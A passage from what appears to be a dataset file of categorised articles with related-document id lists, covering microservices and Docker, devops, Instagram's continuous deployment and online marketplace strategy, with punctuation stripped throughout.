 new technology  and in a safe way  After our facade proxy API goes live  it becomes easier to replace existing functionality with new  as well as adding new features to the system  All you have to do is analyze the request that is coming in   For example  is the request from a source that we know is a developer from the IP username etc   Route it to the new service  If not  then use the old one  For users of your system  the addition is completely transparent  possibly adding a few milliseconds of delay to the response  but from a developer s point of view  this allows you to safely test and deploy the new services   For example  if the endpoint is just a rewrite  you can have 10 percent of the requests use the new endpoint and 90 percent use the old one and do analysis on speed  stability  and the like  If things go wrong  switching back to only using the old system is just a toggle away   Having an endpoint such as this also allows you to do a lot of new things that might have previously been impossible   Another system I was working with had a very jumpy load  Sometimes there were a lot of users running complicated requests  which resulted in higher loads and longer response times  The system didn t have a proper way of replicating itself   Running several instances of it or creating a new feature to boot up more instances to run simultaneously would have been a difficult task since the underlying system wasn t designed with that in mind at all  In the end  it would have required a lot of manhours of work for something that was not really that frequent of an occurrence  It looked bad when it happened  but it wasn t a real problem    We can rebuild him  We have the technology    So on to new technologies  My choice for building new architecture was clear  Docker containers  Not only do containers prevent the obvious problems of  it worked on my computer   but having isolated packages that you can multiply at will and which have a modular architecture by design makes the change from old system to new noticeably easier and cheaper   Instead of having large instances with a lot of resources standing idle during off hours  you can easily spawn more endpoints when needed  saving you money and  in our case  fixing cosmetic problems such as the slowed response times   Apart from Docker containers  the framework I originally went for when building the new system was Node js  I had a good deal of experience with it  but after checking up on where the cutting edge stands  it seemed that Node js was losing ground fast as the go to for simple web APIs  and the new king of the hill was Go  Even to the point that the Node js main developer jumped ship   Go is fairly easy to learn if you have a background in C like languages  It has matured and has a lot of qualities that really make it the language to go to for small  to medium sized web applications    New Call to action  With Docker  Facade Services Open Up Possibilities  With Docker offering the possibility to create your microservices with the tools of your choice  you re no longer locked to one language and one framework  Each microservice can use whatever suits its task best   Instead of having to rely on developers that have learned an old system and its secrets  you can contract a small team to develop a specific functionality and just provide them the documentation of the old API or sources for it in a dummy database services  etc  The contracted team no longer has to become expert in the application  only in the specific feature that it s building  This alone opens the door to new possibilities for the future of your application   Your inhouse developers also won t be working so much on adding features to an obsolete system  creating more dependencies to maintain  but rather on creating new features that can be deployed right after they are made and tested instead of having to test the whole system against the changes   While there will be unprofitable work when creating the skeleton functionality to replace the old one  creating a prototype microservice is much more cost worthy than the price of even starting to arrange meetings about designing a whole new system  And in the end  microservices created in this way might require fewer developers as a workforce for maintaining and enriching your service   Conclusion  I think it s apparent that microservices are the answer for today s development needs  Together with Docker containers  they offer fewer dependencies and a higher degree of scalability than could be easily achieved with traditional macroservices  They also offer a lot of solutions for maintaining a small  focused development crew and even allow outsourcing future feature development with relative ease   We ll follow up in the next post in the series with a tutorial for deploying a facade service to AWS as a Docker container   Want to test and deploy your microservices with Codeship Pro  Find out more here   PS  If you liked this article you can also download it as a PDF eBook here  Breaking up your Monolith into Microservices or watch our re run of our webinar  An Introduction to Building Your Apps with Microservices,"[520 773 234 1351 61 1377 778 695 92 300 1405]"
525,training-dataset/product/1466.txt,product,15 gorgeous website redesign conceptsWhether you re just designing for fun  improving your skills  or bulking up your portfolio web redesign concepts are a fabulous way to peek into the mind of a designer   We dug deep into Dribbble for awesome website redesign concepts and collected a handful of favorites to kick off the week with a little inspiration   Want to be featured in an updated blog post  Share your redesign concepts with us on Twitter   Even more design inspiration,"[525 298 582 641 1246 1336 794 1095 171 262 1403]"
540,training-dataset/engineering/260.txt,engineering,Martin Fowler   OOP2014  Workflows of Refactoring Published on Jul 14  2014  Over the last decade or so  Refactoring has become a widely used technique to keep a high internal quality for a codebase  However most teams don t make enough use of refactoring because they aren t aware of the various workflows in which you can use it  In this keynote talk from OOP 2014 in Munich  Martin Fowler explores some of these workflows  such as Litter Pickup Refactoring  Comprehension Refactoring  and Preparatory Refactoring  Martin also reminds people why common justifications for refactoring will sabotage your best efforts   This talk also has a treatment as an infodeck    More information about Martin Fowler  www martinfowler com  More information about OOP Conference  www oopconference com,"[540 60 800 548 134 794 713 1216 1138 1159 112]"
541,training-dataset/engineering/1137.txt,engineering,What s devops I started reading  Effective DevOps  by Jennifer Davis and Katherine Daniels yesterday   I m still only part of the way through  but I realized while reading it that I had no idea what  devops  even meant  I had some vague idea that it meant  running programs  administrating servers  using chef and puppet  I don t know    I think the term  devops  is kind of contentious and I don t really care to get into discussions about what words do or do not mean  BUT  What is described as  devops  and  the devops movement  in Effective DevOps is an extremely positive thing that I am excited about  So let s talk about what this very positive thing is  and while we talk about it we will call it devops   what isn t devops   One of the first things they clear up is what they don t mean by devops   Not a job title  not an organization  Of course devops is a job title that people use   someone emailed me just today asking if I was interested as a job as a  devops engineer   And that does mean something  but it s not what we re talking about right now   I enjoyed reading this article about devops at Etsy  One of the really key things about this article is   there is no devops organization at Etsy  It s about how developers and operations people work productively together  Also  it was a slow incremental migration towards different practices  They did not wake up one day and become devops  I think this is the first talk that used the term  devops    It s also not about  everyone is a software developer    one of the authors of this book  Katherine Daniels  is a senior operations engineer at Etsy  I don t know any of the details of her job  but my impression is that she has a lot of expertise in operations  It s not like  make operations so easy that nobody has to an expert at it   Of course you need people who know a ton about operations  Probably those people write software as part of their job   not just automation  There have a been a bunch of super positive changes around reducing automation when administering systems  puppet chef  soon  terraform  AWS autoscaling groups  But that is not devops  devops is about how people work together   a definition  sort of  I looked up devops on wikipedia and got this   In traditional functionally separated organizations there is rarely cross departmental integration of these functions with IT operations  devops promotes a set of processes and methods for thinking about communication and collaboration between development  QA  and IT operations   Okay  this is interesting  devops is about  communication and collaboration   That is really different from  chef and puppet and continuous integration and stuff    Puppet is software  communication is about how humans work together   Near the beginning of the book  Davis and Daniels describe some of their respective experiences being the only person on call and in charge of keeping some software running  They then  over the course of the book  talk through a bunch of case studies of organizations moving towards more sustainable practice   This really helped me understand where the book was coming from  I have never worked at an organization with an  operations team  where development and operations were separated into different organizations   So devops is about people who with different strengths effectively collaborating to build awesome software that runs reliably  That is a thing I like   ideas   practices that are part of devops  you should integrate development and operations together  or  you should stop breaking dev and ops apart  thanks tef    operations experts should have a hand in leading systems design and architecture   not just be handed finished systems to run    not just be handed finished systems to run when things go wrong  run blameless postmortems  continuous integration   I also learned from this book what continuous integration was  It is when you merge your changes into a mainline branch very frequently instead of going off and building a feature for weeks     I also learned from this book what continuous integration was  It is when you merge your changes into a mainline branch very frequently instead of going off and building a feature for weeks  configuration management and automation tools like chef puppet   no snowflake servers    There are a lot more things  those are just 5   Most of these things are about processes and people  not about technology   Another pretty important thing here seems to be the devopsdays conferences   it s really cool that there s a series of local conferences that talk about how to operate reliable software and bring people with different kinds of expertise to talk  I haven t been to any of them yet  but bringing people from different companies together to talk seems to be an important part of the  devops movement    assumptions are important  One of my favorite things about this book is that it makes a lot of my assumptions explicit  Etsy influenced a lot of devops ideas  and where I work now is influenced by Etsy  so a lot of this stuff is implicitly familiar to me  But I hadn t thought of them as choices   When I learned what  continuous integration  was  merging your changes into master after working on them for 1 2 days instead of waiting weeks  I was like  uh  wait  what else would you do    A lot of the stuff in this book was like that   I hadn t realized that this was a choice my organization was making  I thought that was just how things were   But of course any organizational choice  like continuous integration  blameless postmortems  having a separate operations team  is a choice  and it s useful to understand why you re making it  Because maybe there are even more improvements you can make over time   what s the difference between devops and SRE   This transcript of a panel discussion on devops vs SRE is good   why devops is exciting    evolution   I think I didn t realize it was exciting because I hadn t really internalized that you could totally separate development and operations  Right now the team I work on has maybe more operational responsibilities than some other teams  but they ve never been separate   But thinking of this as a choice where you recognize how important operational expertise is  train developers to be better at operations  make sure that operational concerns get seen at early stages of the development process   that is super exciting to me  And this book  effective devops  has a lot of ideas that I use already all the time  but it also has ideas that I haven t thought of before   And it makes me want to make my organization even better at it than it already is  because even if we ostensibly practice  devops  and do continuous integration and use jenkins and deploy 100 times a day or whatever  that doesn t actually mean that we re the best and awesome and that we can stop  That is never true  There is always more work to do to make a more awesome organization   And devops seems to be less about a  manifesto   like the extreme programming manifesto  and more of a large and fuzzy set of practices that we re all learning together as an industry over time  That we can constantly improve  And that is okay,"[541 712 596 1126 778 1216 61 1225 87 251 794]"
548,training-dataset/engineering/1307.txt,engineering,Six Challenges Every Organization Will Face Implementing MicroservicesThere are six issues that every organization will run into when attempting to implement a microservice architecture at scale  according Susan Fowler Rigetti  an engineer at Stripe and formerly of Uber  She elaborated on them at the Microservices Practitioner Summit in San Francisco last month   If you are running less than 100 microservices  you might be able to avoid these issues  she said  but scaling the services to any greater level brings its own set of problems that will need to be addressed in order to run your systems efficiently    1  Organizational Silo ing and Sprawl  An inverse of Conway s Law states the organizational structure of the company is going to mirror its architecture  So a company moving to microservices often ends up with several microservices teams that are all siloed  said Fowler Rigetti  In addition  because nobody knows what the other teams are doing  there is no standardization across microservices  and best practices are not shared  leading to tech sprawl    Microservices developers and developer teams become just like microservices   said Fowler Rigetti   They get really good at doing one thing and only that thing   This is great for the specific team but becomes a problem when the developer wants to change teams   Fowler Rigetti said that she s heard from developers who ve changed teams and felt like they ve moved to a different company because the rules are all different    2  More Ways to Fail  Larger and more complex systems mean more opportunities to fail  and the systems will fail  They always do at some point  With hundreds or thousands of microservices deployed  every single one of them is a possible point of failure    3  Competition for Resources  Microservices service organizations are like ecosystems  in that they are really  really complicated and really delicate  said Fowler Rigetti   Both hardware and engineering resources are scarce and expensive  And complicated  Unlike monoliths  one can t just throw unlimited hardware at the problem or increase headcount  This may work in the beginning  she said  but it just doesn t scale by the time you get to a few dozen microservices   How does the organization prioritize when there are hundreds or thousands of microservices  Who gets prioritization  Who makes that decision    4  Misconceptions about Microservices  Misconceptions are rampant among developers and managers alike  and they can be really dangerous to the delicate microservices ecosystem   The most popular myth is that microservices are the Wild West  You can do whatever you want  use whatever code  database  programming language etc   as long as you get the job done and other services can depend on you  There is a huge cost to this  as systems can end up having to maintain multiple libraries and database versions   Another dangerous myth is that microservices are a silver bullet  in that they will solve all your problems  No  said Fowler Rigetti  Microservices should be a step in the evolution of the company s arch when it has reached the limit of its capacity to scale   not as a way out of engineering challenges    5  Technical Sprawl and Technical Debt  When developer teams build a microservices structure using different languages  individual infrastructures and launching custom scripts  the organization ends up with a huge system where there are a thousand ways to do every single thing   It may end up with hundreds or thousands of services some of which are running  most of which are maintained  some of which are forgotten about   You have some script running on a box somewhere doing God knows what and nobody wants to go clean that up   said Fowler Rigetti   They all want to build the next new thing    Word to the wise  No customization is scalable    6  Inherent Lack of Trust  Since microservices live in complex dependency chains and are completely reliant on each other  and there s no standardization or communication  then there is no way to know for sure that the dependencies are reliable  There is  she said  no way of knowing that microservices can be trusted with production traffic   Get Out of the Mess  If you re a developer in a company moving to microservices  none of this is news to you  So how do you get out of the maze   Step one  said Fowler Rigetti  is getting buy in from all levels of the organization  Standardization is not just best practices  but mission critical in order to microservices to work  As such  it needs to be adopted and driven at all levels of the stack   Next is the company needs to  hold all microservices to high architectural  operational  and organizational standards across the entire organization  not on a service by service basis   she explained  Only a microservice that meets these standards is deemed  production ready    Need for Standardization  Fowler Rigetti shared this chart above showing the levels of the microservices environment from a microservices perspective  The only level that the microservices teams need to be working on is on Layer 4   Everything else  she said  needs to be abstracted away from them in order for microservices to be successful  This will limit technical sprawl and increase accountability   A lot of people think they get scalability for free with microservices  but that s not true when you get to a crazy large scale   Next  there needs to a consensus on production readiness requirements  and those requirements need to be part of the engineering culture  Too often  she said  engineers see standardization as a hindrance  but in a new world of microservices where everything belongs in complex dependency chains  it is not   No microservices or set of microservices should compromise the integrity of the overall product or system   What Makes a Service Production Ready   Fowler Rigetti gave a list   Stability  Reliability  Scalability  Performance  Fault Tolerance  Catastrophe Preparedness  Monitoring  Documentation  Fowler Rigetti delved into these categories in more detail   Stability and Reliability  With the microservices there are more changes and faster deployments  leading to instability  A reliable microservice  she said  is one that can be trusted by its clients  dependencies  and the ecosystem as a whole  She sees stability and reliability as linked  with most stability requirements having accompanying reliability requirements  A development pipeline  with several stages before production  is a good example of this   Scalability and Performance  A lot of people think they get scalability for free with microservices  Fowler Rigetti said  but that s not true when you get to a crazy large scale  They need to be able to scale appropriately with increases in traffic   Some languages are not designed to scale efficiently  as they don t allow for concurrency  partitioning and efficiency  This makes it hard for microservices written in those languages to scale appropriately  Fowler Rigetti declined to name any specific languages  but said   I m sure you can think of some    Scalability is how many requests a microservice can handle  she explained  and performance is how well the service can process those tasks  A performant microservice properly utilizes resources  processes tasks efficiently  and handles requests quickly   A microservice that can t scale with expected growth is likely to have a drastic increase in incidents and outages  The increase in latency leads to poor availability   Fault Tolerance and Catastrophe Preparedness  To ensure availability  the ultimate goal  the developers need to ensure that none of the ways the microservice can fail will take down the system  So developers need to know all the failure modes and have backups in case failure occurs   Robust resiliency testing is key to successful catastrophe preparedness  she said  including code testing  load testing  and chaos testing among other pro active tests  Every single failure mode should be pushed into production to see how it survives   Given the complexity of the microservices environment and the complex dependency chains  failure is inevitable  Microservices need to be able to withstand both internal and external failures   Monitoring and Documentation   Something I discovered in a terrifying way   Fowler Rigetti said   is with microservices architecture is that the state of the system is never the same from one second to another  If you re not aware of the state of the system  you won t know when the system fails  and it will fail   she stated   Good monitoring tools showing the state of the system at all times are critical  The second most common cause of outages is a lack of good monitoring   Logging is an essential part of monitoring because you will almost never be able to replicate a bug  according to Fowler Rigetti  The only way to know what happened is to ensure that you recorded the state of the system at that time  And the only way to do that is through proper logging   This makes it really easy to trust your services   Documentation is the bane of every developer  but it is critical  It removes technical debt and allows people from other teams  or new members of the team to come up to speed   Check out Fowler Rigetti s book  Production Ready Microservices  for more wisdom  including detailed requirements  and a roadmap for moving forward   Feature image via Pixabay,"[548 773 60 1126 278 1159 1377 234 695 1405 778]"
550,training-dataset/engineering/968.txt,engineering,Continuous Deployment at Instagram   Instagram EngineeringContinuous Deployment at Instagram  At Instagram  we deploy our backend code 30 50 times a day  whenever engineers commit changes to master  with no human involvement in most cases  This may sound crazy  especially at our scale  but it works really well  This post talks about how we implemented this system and got it working smoothly   Why do it   Continuous deployment has a number of advantages for us   It lets our engineers move really fast  They aren t limited to a few deployments per day at fixed times  instead  they can get code deployed whenever they want  This means that they waste less time and can iterate on changes very quickly  It makes it much easier to identify bad commits  Instead of having to dig through tens or hundreds of commits to find the cause of a new error  the pool is narrowed down to one  or at most two or three  This is also really useful when you identify a problem later and go back to debug  The metrics or data that indicate the problem can be used to identify an accurate start time  and from there we can find which commits were deployed at that time  Bad commits get detected very quickly and dealt with  which means that we don t end up with an undeployable mess in master and cause significant delays for other unrelated changes  We re always in a state where we can get important fixes out quickly   Implementation  The success of this implementation can largely be attributed to its construction s iterative approach  Instead of building this system on the side and suddenly switching over  we evolved the current mechanisms until they became continuous deployment   How it worked before  Before continuous deployment  engineers deployed changes on an ad hoc basis  They d land changes  and if they wanted them deployed soon  they d run a rollout  Otherwise they d wait for another engineer to come along and do so  Engineers were expected to know how to do a small scale test beforehand  they would do a rollout targeting one machine  log into that machine and check the logs  and then run a second rollout targeting the entire fleet  This was all implemented as a Fabric script  and we had a very basic database and UI called  Sauron  which stored a log of rollouts   Canary and testing  The first step was adding canarying  which was initially simply scripting what engineers were already expected to do  Instead of running a separate rollout targeting one machine  the script deployed to the canary machine  tailed the logs for user  and asked whether it should continue to the full deploy  Next came some basic analysis of the canary machine  a script collected the HTTP status codes for each request  categorized them  and applied hard coded percentage thresholds  e g  less than 0 5  5xx  at least 90  2xx   However  this would only warn the user if the thresholds failed   We already had a test suite  but it was only run by engineers on their development machines  Code reviewers had to take the author s word that the tests passed  and we didn t know the test status of the resulting commit in master  So we setup Jenkins to run tests on new commits in master and report the result to Sauron  Sauron would keep track of the latest commit which had passed tests  and when doing a rollout this commit would be suggested instead of the latest commit   Facebook uses Phabricator  http   phabricator org   for code reviews  and has a Continuous Integration system called Sandcastle which integrates well with Phabricator  We got Sandcastle to run tests whenever a diff was created or updated  and report the result to the diff   Automate  To get to automation  we first had to lay some groundwork  We added states to rollouts  running  done  error   and made the script warn if the previous rollout was not in  done  state  We added an abort button in the UI which would change the state to  abort   and got the script to check the state occasionally and react  We also added full commit tracking  instead of Sauron only knowing the latest commit which had passed tests  it now had a record for every commit in master  and knew the test status of each specific one   Then we automated the remaining decisions which humans needed to make  The first decision was which commit to roll out  The initial algorithm was to always select a commit which had passed tests and select as few commits as possible   never more than three  If every commit had passed tests  it would select one new commit each time  and there could be at most two consecutive commits with non passing test runs  The second decision was whether the rollout was successful  If more than 1  of hosts failed to deploy  it would be considered failed   At this point  doing a rollout when things were normal simply consisted of answering  yes  a couple times  accepting the suggested commit  starting the canary  and continuing to the full deploy   So we allowed these questions to be answered automatically  and got Jenkins to run the rollout script  At first engineers implementing this only enabled Jenkins when they were at their desks supervising  until they didn t need to supervise it anymore   Problems  While we were doing continuous deployment at this stage  it wasn t completely smooth yet  There were a couple kinks to work out   Test failures  Engineers would often land diffs that broke tests  which would cause all subsequent master commits to also fail tests  and thereby prevent anything from being deployed  The oncall would need to notice this  revert the offending commit  wait for tests to pass on the revert  and then manually roll out the entire backlog before the automation could continue  This defeated one of the main advantages of continuous deployment  which was deploying very few commits per rollout  The problem here was that tests were slow and unreliable  We made various optimizations to get tests running in five minutes instead of 12 15 minutes  and fixed the test infrastructure problems that were causing them to be unreliable   Backlogs  Despite these improvements  we still regularly have a backlog of changes that need to be deployed  The most common cause is canary failures  both false and true positives   but there are occasionally other breakages  When the cause was resolved  the automation would pick up and deploy one commit at a time  so it would take a while to clear the backlog and cause significant delays for newly landed diffs  The oncall would usually step in and deploy the entire backlog at once  which defeats one of the main advantages of continuous deployments   To improve this  we implemented backlog handling in the commit selection logic  which made the automation deploy multiple commits when there was a backlog  The algorithm is based on setting a time goal in which to deploy every commit  30min   For each commit in the queue  it calculates the time remaining to meet the goal  the number of rollouts that can be done in that time  using a hard coded value   and the number of commits that would have to be deployed per rollout  It takes the maximum commits rollout value  but caps it at three  This allows us to do as many rollouts as possible  while getting every commit out in a reasonable time   One specific cause of backlogs was that rollouts got slower as the size of our infrastructure increased  We got to a point where ssh agent pegged an entire core authenticating SSH connections  and the fab master process also pegged a core managing all the tasks  The solution here was to switch to Facebook s distributed SSH system   Guiding principles  So what do you need in order to implement something similar to what we ve done  There are a few key principles which make our system work well  which you can apply to your own   Tests  The test suite needs to be fast  It needs to have decent coverage  but doesn t necessarily have to be perfect  The tests need to be run often  during code review  before landing  and ideally blocking lands on failure   and after landing  Canary  You need an automated canary to prevent the really bad commits from being deployed to the entire fleet  It doesn t need to be perfect  however   even a very simple set of stats and thresholds can be good enough  Automate the normal case  You don t have to automate every situation  just automate the known  normal situations  If anything is abnormal  make the automation stop and let humans step in  Make people comfortable  I think that a big barrier to this kind of automation is when people feel disconnected and out of control  To address this  the system needs to provide good visibility into what it has done  is doing  and  preferably  is about to do  It also needs good stop mechanisms  Expect bad deploys  Bad changes will get out  but that s okay  You just need to detect this quickly  and be able to roll back quickly   This is something that many other companies can implement  Continuous deployment systems don t need to be complex  Start with something simple that focuses on the principles above  and refine it from there   What s next  This system is working well for us at the moment  but there are further challenges which we will face and improvements we d like to make,"[550 1010 1225 1029 1235 579 597 1399 1252 683 1351]"
572,training-dataset/business/229.txt,business,Network Effects Aren t EnoughSeveral other important pitfalls can threaten marketplaces  growing too fast too early  failing to foster sufficient trust and safety  resorting to sticks  rather than carrots  to deter user disintermediation  and ignoring the risks of regulation   Yet online marketplaces remain extremely difficult to build  say Andrei Hagiu of Harvard Business School and venture capitalist Simon Rothman of Greylock Partners  Most entrepreneurs and investors attribute this to the challenge of quickly attracting a critical mass of buyers and suppliers  But it is wrong to assume that once a marketplace has overcome this hurdle  the sailing will be smooth   In many ways  online marketplaces are the perfect business model  Since they facilitate transactions between independent suppliers and customers rather than take possession of and responsibility for the products or services in question  they have inherently low cost structures and fat gross margins  They are highly defensible once established  owing to network effects   Idea in Brief The Misconception Most entrepreneurs believe that the key challenge in building online marketplaces is to attract a critical mass of buyers and sellers  But before or even after that hurdle has been overcome  there are others looming that can hurt  if not kill  these businesses  Overlooked Challenges Growing too quickly can exacerbate the flaws that are inevitable in any business model  Common approaches for establishing trust and safety rarely work on their own  Using sticks rather than carrots to deter disintermediation can backfire  And regulatory issues can derail a promising business  The Solution Before scaling  marketplaces must lay out a compelling value proposition for buyers and sellers  They need to build trust and create incentives to keep them on the platform  And they need to engage regulators as soon as their buyer seller proposition is clear   In many ways  online marketplaces are the perfect business model  Since they just facilitate transactions between suppliers and customers rather than take possession of or full responsibility for products or services  they have very low cost structures and very high gross margins 70  for eBay  60  for Etsy  And network effects make them highly defensible  Alibaba  Craigslist  eBay  and Rakuten are more than 15 years old  but they still dominate their sectors   Little wonder that entrepreneurs and investors are rushing to build the next eBay or Airbnb or Uber for every imaginable product and service category  In the past 10 years  the number of marketplaces worth more than  1 billion has gone from two Craigslist and eBay to more than a dozen in the United States  including Airbnb  Etsy  Groupon  GrubHub Seamless  Lending Club  Lyft  Prosper  Thumbtack  Uber  and Upwork  And that number is expected to double by 2020  according to Greylock Partners  a Silicon Valley venture capital firm where one of us  Simon  is a partner   Yet online marketplaces remain extremely difficult to build  Most entrepreneurs see it as a chicken and egg problem  To attain a critical mass of buyers  you need a critical mass of suppliers but to attract suppliers  you need a lot of buyers  This challenge does indeed trip up many marketplaces  But even after a marketplace has attracted a critical mass of both buyers and sellers  it s far from smooth sailing  Our combined experience in evaluating  advising  and investing in hundreds of marketplace businesses  including several mentioned in this article  suggests that other pitfalls can derail marketplaces  growing too fast too early  fostering insufficient trust and safety  resorting to sticks rather than carrots to deter user disintermediation  and regulatory risk  In this article  we discuss how to avoid those hazards   Growth  Once marketplaces reach a critical inflection point  network effects kick in and growth follows an exponential  rather than linear  trajectory  These network effects also create barriers to entry  Once many buyers and sellers are using a marketplace  it becomes harder for a rival to lure them away  As a result  entrepreneurs often mistakenly assume that they need to reach the exponential growth phase as quickly as possible  But a headlong rush to fast growth is often unnecessary and can even backfire  for several reasons   The importance of first mover advantage for marketplaces is overstated   Entrepreneurs should really focus on being the first to create a liquid market in their segment  The winning marketplace is the first one to figure out how to enable mutually beneficial transactions between suppliers and buyers not the first one out of the gate  Indeed  many prominent marketplaces were not first movers  Airbnb was founded more than a decade after VRBO  Alibaba was a second mover in China after eBay  and Uber s UberX copied Lyft s peer to peer taxi business model   Why does being the first mover provide less of an advantage than is commonly assumed  The reason is that chasing early growth before a marketplace has proved its value to both buyers and sellers leaves the business vulnerable to competition from later entrants  If either side s users do not derive significant value on a consistent basis  they will readily jump ship  But when buyers have access to a sufficient selection of products or services at attractive prices and sellers earn attractive profits  neither side has an incentive to go elsewhere  and strong network effects kick in rapidly  More buyers bring more sellers and vice versa   Groupon and LivingSocial platforms where retailers sell discounted offerings to consumers provide a cautionary tale  Both companies expanded aggressively  attracting millions of users and thousands of merchants  Their success  however  was short lived  Once merchants realized that Groupon and LivingSocial discounts did not bring repeat customers  they began to do business on many competing deal sites  As a result  Groupon s value fell from  18 billion at the time of its 2011 IPO to less than  2 billion today  LivingSocial filed for an IPO at  10 billion in 2011  withdrew  and was acquired by Amazon  By the end of 2014  it was worth less than  250 million   Growing too early puts stress on the business model   A start up s initial business model inevitably has flaws that must be fixed  But because growth for marketplaces can be so explosive  it puts much more pressure on the business model than does the more linear growth experienced by regular product or service firms  amplifying the impact of the flaws and making them harder to fix  Indeed  trying to change the model while growing very fast increases the risk of a catastrophic breakdown  Thus  premature growth can actually reduce the probability of reaching the inflection point that triggers exponential growth   Further Reading Mastering the Intermediaries Competitive Strategy Feature Strategies for dealing with the likes of Google  Amazon  and Kayak  Save Share    For these reasons  marketplace entrepreneurs should resist the temptation to accelerate growth before figuring out an optimal supply demand fit that is  when buyers are as happy to purchase the products or services as providers are to supply them  This may mean waiting much longer than conventional companies do to scale a new offering  For example  Airbnb took two years to figure out exactly how to allow individuals to rent their homes to complete strangers under conditions and at prices that satisfied both parties   Recall that the initial service was an air mattress and a cooked breakfast  In most cases  this was either not what travelers wanted or not something hosts were willing to offer    The wrong type of growth can hurt performance   Many marketplaces find it tempting to grow through  power sellers  those who have moved from selling as a hobby or source of supplemental income to running a full time business on the marketplace  That s because attracting a few power sellers is more cost effective than attracting many nonprofessional sellers  and the former tend to be more efficient at carrying out transactions than the latter   However  growth through power sellers can be undesirable  After building most of its early growth on power sellers  eBay discovered that their dominance forced it to make compromises that favored those sellers but hurt the buyer experience  For example  power sellers demanded the ability to do  bulk listings   to automate the listing of many products   which was more efficient from the sellers  point of view  This created problems for eBay  By skewing seller incentives toward commodity goods  bulk listings reduced the diversity of products offered for sale  crowding out unique products and causing the quality of the average listing to go down  Furthermore  bulk listings enabled power sellers to negotiate lower per listing fees from eBay  Over the years  power sellers came to dominate eBay s supply side and made it difficult for nonprofessional sellers to compete   Growing too early amplifies flaws in the business model  making them harder to fix   Other types of marketplaces face a similar issue  In the case of Airbnb  multi property hosts might show pictures of certain apartments on the site but switch travelers to different ones upon arrival to suit the hosts  planning needs  Or hosts that bought property specifically to list on the site might not provide the authentic experience that travelers seek  As a result  Airbnb may have to place some limits on multi property hosts  even though that would conceivably negatively impact growth in the short run   The bottom line  Platforms should resist the temptation to use the industrialization of the supply side to boost growth   Trust and Safety  By definition  an online marketplace does not directly control the quality of the products or services that are bought and sold on its platform  so it must put mechanisms in place to ensure that participants have little or no fear about conducting business on the site  The goal is to eliminate  or at least minimize  improper behavior  such as abusing rented property  misrepresenting products  and outright fraud   Ratings and reviews systems have been the most widely used mechanism for engendering trust between marketplace participants ever since eBay s first successful large scale implementation of such a system  in 1998  Nearly all prominent marketplaces use R R systems  which typically allow the two sides of the market to rate and review each other by awarding stars  1 to 5   providing text feedback  or both   Airbnb s Remarkable Growth It didn t take long for Airbnb to surpass conventional hotel chains in rooms available worldwide  Its growth and market cap reflect the outsize potential of online marketplaces  Company Number of Rooms Founded Market Cap Time to 1M Rooms Real Estate Assets Airbnb 1M  2008  25B 7 YRS  0 Marriott 1 1M 1957  16B 58 YRS  985M Hilton 745K 1919  19B N A  9 1B Intercontinental  Hotel Group 727K 1988  9B N A  741M Source Reuters  Marriott  InterContinental Hotels Group  Wikipedia  New York Times  BamSEC  Data as of end of 2015  From  Network Effects Aren t Enough   April 2016   HBR ORG  However  research shows that these systems rarely build sufficient trust or provide adequate safety on their own  Many online R R systems suffer from significant biases  People who voluntarily rate a product or service tend to be either very happy or very unhappy with it  This severely undermines the value of the information provided and skews results   For instance  a recent study estimated that more than 50  of eBay sellers have received positive feedback for 100  of the transactions rated by their buyers  and 90  of sellers have received positive feedback for more than 98  of the transactions rated by their buyers  There are several reasons for this  Many buyers want to be nice  so they leave exceedingly generous reviews  Some fear that sellers will harass them by e mail if they leave negative feedback  Many unhappy buyers simply leave and do not return to the site  And a few take extreme  and comical  measures  A good example of an R R system gone awry is the phenomenon of sarcastic reviews on Amazon s marketplace  Fake reviewers take over the comments for a product or service  awarding 4 or 5 stars and then writing ironically scathing  often hilarious comments   Further Reading Do You Really Want to Be an eBay  Competitive strategy Magazine Article Structuring your business as a marketplace may seem attractive  but it s often a recipe for failure  Save Share    Even reliable ratings and reviews systems are not enough to overcome potential users  fears that something bad might happen  especially when the stakes are high  It s hard to imagine buying or renting cars or houses from complete strangers solely on the basis of positive user reviews  And when things go wrong  users often hold the marketplace at least partly responsible  even though technically it is merely an enabler of transactions  A buyer who has a bad experience may blame the corresponding seller and leave a bad review  but he or she may also blame the marketplace and never return  which hurts all other sellers   To properly engender trust and overcome fears  marketplaces must go beyond R R systems and accept some de facto responsibility for transactions  This can take several forms   Provide insurance to one or both parties in a transaction   Turo  formerly RelayRides   a marketplace where individuals can rent their cars to other people  offers specially designed insurance policies that provide coverage to both parties  Airbnb now insures hosts against property damage of up to  1 million  Lyft and Uber provide insurance coverage to their drivers for damage done to others   Vet and certify participants   Upwork  formerly Elance oDesk  has developed hundreds of proprietary certification tests that it administers to freelance contractors on its platform to assure buyers that the workers they hire are qualified   Offer dispute resolution and payment security services   Airbnb holds the money paid by the traveler in escrow for 24 hours after the traveler has checked in  Alibaba holds the money paid by the buyer in escrow until the buyer confirms receipt of the goods from the seller  And both Airbnb and Alibaba have comprehensive dispute resolution procedures that offer recourse to both sides of the market   Disintermediation  Many marketplaces fear that once they facilitate a successful transaction  the buyer and the seller will agree to conduct their subsequent interactions outside the marketplace  This risk is greatest for marketplaces that handle high value transactions  eBay Motors  Beepi  or recurring transactions  Airbnb  CoachUp  Handy  HourlyNerd  Upwork   But in our experience  entrepreneurs tend to overestimate the threat of disintermediation and choose the wrong approach to prevent it   The instinct is often to impose penalties  such as temporarily suspending accounts  if attempts to take transactions off a platform are detected  The fact of the matter is that all marketplaces that facilitate high value or recurring transactions suffer some disintermediation  Some hosts and guests take their transactions off Airbnb  as do some contractors and employers that first connected on Upwork  But we have yet to see a promising marketplace that has been severely hindered let alone put out of business by this behavior  and we ve found that carrots are more effective deterrents than sticks  For example  algorithms for detecting transactions initiated online but completed offline are difficult and costly to implement and can create user resentment   Entrepreneurs tend to overestimate the threat of disintermediation   Participants usually prefer to conduct business in a  well lit showroom  that reduces search or transaction costs and allows deals to be conducted securely and comfortably  As long as a marketplace provides value  there should be sufficient incentive for one or both sides to conduct all their transactions through the platform  If users find it onerous to do so  then either the marketplace does not create enough value or its fees are too high   One company that has successful incentives to combat disintermediation is eBay Motors  It provides an automatic purchase protection service against certain types of fraud  for example  nondelivery of the vehicle   facilitates car inspections through partner shops at discounted rates  and uses its bargaining power to help sellers obtain lower shipping costs  Another example is Upwork  In addition to providing worker certifications  it allows employers to audit and monitor the work being done by contractors in real time  It also allows them to process online payments in many currencies at discounted exchange fees  As these examples show  some of the mechanisms that make transactions safer to conduct also help reduce the risk of disintermediation  killing two birds with one stone   Regulation  Online marketplaces that provide radically new alternatives to conventional business models test the limits of existing regulatory frameworks almost by definition  They enable new types of transactions  such as peer to peer lending or property rentals 